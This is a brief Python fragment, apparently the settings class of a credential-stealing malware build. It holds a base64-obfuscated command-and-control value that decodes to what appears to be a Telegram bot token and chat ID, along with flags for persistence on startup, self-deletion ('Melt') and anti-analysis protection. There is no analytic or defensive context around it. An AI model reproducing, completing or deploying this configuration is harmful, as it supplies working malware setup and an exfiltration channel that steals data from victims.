...
class Settings:
    C2 = (1, base64.b64decode('ODM0MTczOTc1NTpBQUZJNnRLcGxrcE5zd3JiSnpRZ2xTZm00dzY3akdBVkhMcyQ1MjI0ODEyMDM0').decode())
    Mutex = base64.b64decode('ME9WV1NzZHZyNXdVMDlrTQ==').decode()
    PingMe = bool('')
    Vmprotect = bool('')
    Startup = bool('')
    Melt = bool('')
